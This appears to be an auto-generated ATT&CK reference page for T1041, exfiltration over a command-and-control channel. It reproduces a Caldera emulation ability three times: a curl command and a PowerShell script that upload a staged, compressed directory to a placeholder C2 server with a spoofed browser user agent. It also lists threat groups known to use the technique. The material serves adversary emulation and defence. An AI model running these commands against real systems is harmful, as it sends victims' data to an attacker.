
# Exfiltration Over Command and Control Channel

## Description

### MITRE Description

> Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1041

## Potential Commands

```
{'darwin': {'sh': {'command': 'curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload\n'}}, 'linux': {'sh': {'command': 'curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload\n'}}, 'windows': {'psh,pwsh': {'command': '$ErrorActionPreference = \'Stop\';\n$fieldName = \'#{host.dir.compress}\';\n$filePath = \'#{host.dir.compress}\';\n$url = "#{server}/file/upload";\n\nAdd-Type -AssemblyName \'System.Net.Http\';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + \'-#{paw}\');\n$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n'}}}
```

## Commands Dataset

```
[{'command': {'darwin': {'sh': {'command': 'curl -F '
                                           '"data=@#{host.dir.compress}" '
                                           '--header "X-Request-ID: '
                                           '`hostname`-#{paw}" '
                                           '#{server}/file/upload\n'}},
              'linux': {'sh': {'command': 'curl -F '
                                          '"data=@#{host.dir.compress}" '
                                          '--header "X-Request-ID: '
                                          '`hostname`-#{paw}" '
                                          '#{server}/file/upload\n'}},
              'windows': {'psh,pwsh': {'command': '$ErrorActionPreference = '
                                                  "'Stop';\n"
                                                  '$fieldName = '
                                                  "'#{host.dir.compress}';\n"
                                                  '$filePath = '
                                                  "'#{host.dir.compress}';\n"
                                                  '$url = '
                                                  '"#{server}/file/upload";\n'
                                                  '\n'
                                                  'Add-Type -AssemblyName '
                                                  "'System.Net.Http';\n"
                                                  '\n'
                                                  '$client = New-Object '
                                                  'System.Net.Http.HttpClient;\n'
                                                  '$content = New-Object '
                                                  'System.Net.Http.MultipartFormDataContent;\n'
                                                  '$fileStream = '
                                                  '[System.IO.File]::OpenRead($filePath);\n'
                                                  '$fileName = '
                                                  '[System.IO.Path]::GetFileName($filePath);\n'
                                                  '$fileContent = New-Object '
                                                  'System.Net.Http.StreamContent($fileStream);\n'
                                                  '$content.Add($fileContent, '
                                                  '$fieldName, $fileName);\n'
                                                  '$client.DefaultRequestHeaders.Add("X-Request-Id", '
                                                  '$env:COMPUTERNAME + '
                                                  "'-#{paw}');\n"
                                                  '$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 '
                                                  '(Windows NT 10.0; Win64; '
                                                  'x64) AppleWebKit/537.36 '
                                                  '(KHTML, like Gecko) '
                                                  'Chrome/60.0.3112.113 '
                                                  'Safari/537.36");\n'
                                                  '\n'
                                                  '$result = '
                                                  '$client.PostAsync($url, '
                                                  '$content).Result;\n'
                                                  '$result.EnsureSuccessStatusCode();\n'}}},
  'name': 'Exfil the staged directory',
  'source': 'data/abilities/exfiltration/ea713bc4-63f0-491c-9a6f-0b01d560b87e.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Exfil the staged directory': {'description': 'Exfil the '
                                                                  'staged '
                                                                  'directory',
                                                   'id': 'ea713bc4-63f0-491c-9a6f-0b01d560b87e',
                                                   'name': 'Exfil staged '
                                                           'directory',
                                                   'platforms': {'darwin': {'sh': {'command': 'curl '
                                                                                              '-F '
                                                                                              '"data=@#{host.dir.compress}" '
                                                                                              '--header '
                                                                                              '"X-Request-ID: '
                                                                                              '`hostname`-#{paw}" '
                                                                                              '#{server}/file/upload\n'}},
                                                                 'linux': {'sh': {'command': 'curl '
                                                                                             '-F '
                                                                                             '"data=@#{host.dir.compress}" '
                                                                                             '--header '
                                                                                             '"X-Request-ID: '
                                                                                             '`hostname`-#{paw}" '
                                                                                             '#{server}/file/upload\n'}},
                                                                 'windows': {'psh,pwsh': {'command': '$ErrorActionPreference '
                                                                                                     '= '
                                                                                                     "'Stop';\n"
                                                                                                     '$fieldName '
                                                                                                     '= '
                                                                                                     "'#{host.dir.compress}';\n"
                                                                                                     '$filePath '
                                                                                                     '= '
                                                                                                     "'#{host.dir.compress}';\n"
                                                                                                     '$url '
                                                                                                     '= '
                                                                                                     '"#{server}/file/upload";\n'
                                                                                                     '\n'
                                                                                                     'Add-Type '
                                                                                                     '-AssemblyName '
                                                                                                     "'System.Net.Http';\n"
                                                                                                     '\n'
                                                                                                     '$client '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     'System.Net.Http.HttpClient;\n'
                                                                                                     '$content '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     'System.Net.Http.MultipartFormDataContent;\n'
                                                                                                     '$fileStream '
                                                                                                     '= '
                                                                                                     '[System.IO.File]::OpenRead($filePath);\n'
                                                                                                     '$fileName '
                                                                                                     '= '
                                                                                                     '[System.IO.Path]::GetFileName($filePath);\n'
                                                                                                     '$fileContent '
                                                                                                     '= '
                                                                                                     'New-Object '
                                                                                                     'System.Net.Http.StreamContent($fileStream);\n'
                                                                                                     '$content.Add($fileContent, '
                                                                                                     '$fieldName, '
                                                                                                     '$fileName);\n'
                                                                                                     '$client.DefaultRequestHeaders.Add("X-Request-Id", '
                                                                                                     '$env:COMPUTERNAME '
                                                                                                     '+ '
                                                                                                     "'-#{paw}');\n"
                                                                                                     '$client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 '
                                                                                                     '(Windows '
                                                                                                     'NT '
                                                                                                     '10.0; '
                                                                                                     'Win64; '
                                                                                                     'x64) '
                                                                                                     'AppleWebKit/537.36 '
                                                                                                     '(KHTML, '
                                                                                                     'like '
                                                                                                     'Gecko) '
                                                                                                     'Chrome/60.0.3112.113 '
                                                                                                     'Safari/537.36");\n'
                                                                                                     '\n'
                                                                                                     '$result '
                                                                                                     '= '
                                                                                                     '$client.PostAsync($url, '
                                                                                                     '$content).Result;\n'
                                                                                                     '$result.EnsureSuccessStatusCode();\n'}}},
                                                   'requirements': [{'plugins.stockpile.app.requirements.paw_provenance': [{'source': 'host.dir.compress'}]}],
                                                   'tactic': 'exfiltration',
                                                   'technique': {'attack_id': 'T1041',
                                                                 'name': 'Exfiltration '
                                                                         'Over '
                                                                         'Command '
                                                                         'and '
                                                                         'Control '
                                                                         'Channel'}}}]
```

# Tactics


* [Exfiltration](../tactics/Exfiltration.md)


# Mitigations

None

# Actors


* [Gamaredon Group](../actors/Gamaredon-Group.md)

* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [APT3](../actors/APT3.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [APT32](../actors/APT32.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
